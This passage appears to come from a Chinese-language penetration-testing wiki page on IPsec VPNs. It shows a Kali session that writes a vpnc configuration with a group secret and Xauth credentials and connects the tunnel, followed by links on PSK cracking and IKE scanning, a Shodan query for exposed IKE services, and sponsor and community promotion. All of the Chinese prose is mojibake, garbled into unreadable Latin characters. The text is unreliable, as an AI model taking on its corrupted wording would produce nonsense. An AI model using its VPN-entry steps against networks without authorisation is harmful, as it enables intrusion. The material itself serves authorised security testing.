åœ¨Kaliä¸­ï¼Œä½¿ç”¨**VPNC**å»ºç«‹IPsecéš§é“ã€‚**é…ç½®æ–‡ä»¶**å¿…é¡»ä½äº_**/etc/vpnc/**_ä¸­ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨å·¥å…·_**vpnc**_æ¥è°ƒç”¨å®ƒä»¬ã€‚\
ä»¥ä¸‹ç¤ºä¾‹æ‘˜è‡ªä¹¦ç±**Network Security Assessment 3rd Edition**ï¼š
```
root@kali:~# cat > /etc/vpnc/vpntest.conf << STOP
IPSec gateway 10.0.0.250
IPSec ID vpntest
IPSec secret groupsecret123
IKE Authmode psk
Xauth username chris
Xauth password tiffers1
STOP
root@kali:~# vpnc vpntest
VPNC started in background (pid: 6980)...
root@kali:~# ifconfig tun0
```
## å‚è€ƒèµ„æ–™

* [PSKç ´è§£è®ºæ–‡](http://www.ernw.de/download/pskattack.pdf)
* [SecurityFocus Infocus](http://www.securityfocus.com/infocus/1821)
* [æ‰«æVPNå®ç°](http://www.radarhack.com/dir/papers/Scanning\_ike\_with\_ikescan.pdf)

## Shodan

* `port:500 IKE`

<figure><img src="broken-reference" alt=""><figcaption></figcaption></figure>

æ‰¾åˆ°æœ€é‡è¦çš„æ¼æ´ï¼Œä»¥ä¾¿æ›´å¿«åœ°ä¿®å¤å®ƒä»¬ã€‚Intruderè·Ÿè¸ªæ‚¨çš„æ”»å‡»é¢ï¼Œè¿è¡Œä¸»åŠ¨å¨èƒæ‰«æï¼Œå‘ç°æ•´ä¸ªæŠ€æœ¯å †æ ˆä¸­çš„é—®é¢˜ï¼Œä»APIåˆ°Webåº”ç”¨ç¨‹åºå’Œäº‘ç³»ç»Ÿã€‚[**ç«‹å³å…è´¹è¯•ç”¨**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks)ã€‚

{% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricksäº‘ â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* æ‚¨åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿæ‚¨æƒ³åœ¨HackTricksä¸­çœ‹åˆ°æ‚¨çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…æ‚¨æƒ³è·å¾—æœ€æ–°ç‰ˆæœ¬çš„PEASSæˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTrickså—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFTæ”¶è—å“**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–åœ¨**Twitter**ä¸Š**å…³æ³¨**æˆ‘[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚**

</details>
